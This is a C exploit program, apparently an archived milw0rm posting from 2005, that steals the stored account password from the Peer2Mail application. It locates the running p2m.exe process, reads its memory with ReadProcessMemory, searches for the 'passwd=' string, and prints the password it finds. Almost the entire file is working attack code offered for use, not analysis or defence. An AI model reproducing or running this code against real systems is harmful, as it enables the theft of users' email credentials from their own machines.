/*
* Peer2Mail Encrypt PassDumper Exploit  v1.0
* Discoveried & Coded By ATmaCA
* Copyright �2002-2005 AtmacaSoft Inc. All Rights Reserved.
* Web: http://www.atmacasoft.com
* E-Mail: atmaca@icqmail.com
*/

/*
* Peer2Mail 1.4 and prior versions are affected.
* Tested for gmail account on Win XP SP2
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>

void Credits(void);
DWORD GetPid(char ProcessName[200]);
int PutUserPassword(DWORD pid);

int main(void)
{
   char TargetProcess[80];
   DWORD pid;

   Credits();  //print the credits to the screen

   pid=GetPid("p2m.exe"); //Get the PID of the target process
   if(pid==0)
   {
        printf("Error: Getting pid from %s",TargetProcess);
        return EXIT_FAILURE;
   }

   if(PutUserPassword(pid)!=0) //if we can not get the password
        return EXIT_FAILURE;

   return EXIT_SUCCESS;

}
void Credits()   //the function that prints the credits to the screen
{
     printf("Peer2Mail Encrypt PassDumper Exploit  v1.0\n");
     printf("Discoveried & Coded By [ATmaCA]\n");
     printf("Copyright �2002-2005 AtmacaSoft Inc. All Rights Reserved.\n");
     printf("Web: http://www.atmacasoft.com\n");
     printf("E-Mail: atmaca@icqmail.com\n\n");
}

DWORD GetPid(char ProcessName[200]) //gets the process-id from the processname
{
       DWORD pid;
       HANDLE Snap;
       PROCESSENTRY32 proc32;
       char CapProcessName[200];

       strcpy(CapProcessName,CharLower(ProcessName));

       Snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);  //Create a snapshot of all current running processes
       if(Snap==INVALID_HANDLE_VALUE)
       {
           printf("Error creating snapshot of current processes.");

           return 0;
       }

       proc32.dwSize=sizeof(PROCESSENTRY32);
       while((Process32Next(Snap,&proc32))==TRUE)  //Get the process-id from p2m.exe
       {
             if(strcmp(CharLower(proc32.szExeFile),CharLower(ProcessName))==0||strcmp(CharLower(proc32.szExeFile),CharLower(CapProcessName))==0)
                    break;

       }
       pid=proc32.th32ProcessID;
       CloseHandle(Snap);
       return pid;
}

int PutUserPassword(DWORD pid)
{
   #define BUFSIZE 500000

   HANDLE hProc;
   DWORD total;
   long int base;
   char buf[BUFSIZE];
   char pass[BUFSIZE];
   int i=0,j,k;

       //open the process
       hProc=OpenProcess(PROCESS_VM_READ,FALSE,pid);
       if(hProc==NULL)
       {
           printf("Error: opening process.");
           printf("\nPerhaps this account is too limited..");
           return 1;
       }

       //
       // The Base Memory Address To Search;
       // The Password May Be Located Before The Address Or Far More From This Address,
       // Which Causes The Result Unreliable
       //
       base=0x01320000;

       //try to read the memory of p2m.exe
       while(ReadProcessMemory(hProc,(PVOID)base,buf,BUFSIZE,&total)!=0)
       {
           for(i=0;i<BUFSIZE;i++)
           {
               if(buf[i]=='p'&&buf[i+1]=='a'&&buf[i+2]=='s'&&buf[i+3]=='s'&&buf[i+4]=='w'&&buf[i+5]=='d'&&buf[i+6]=='=')
               {
                   j=0;
                   for(k=i+7;k<BUFSIZE;k++)
                   {
                       if(buf[k]=='&')//check if we've reached the end of the password
                       {
                            pass[j]=NULL;
                            goto gotit;
                       }
                       pass[j]=buf[k];
                       j++;
                   }
                   break;
               }
           }
           base+=BUFSIZE;
       }
       gotit:
       printf("Password: %s",pass);
       CloseHandle(hProc);
       return 0;
}

// milw0rm.com [2005-01-16]
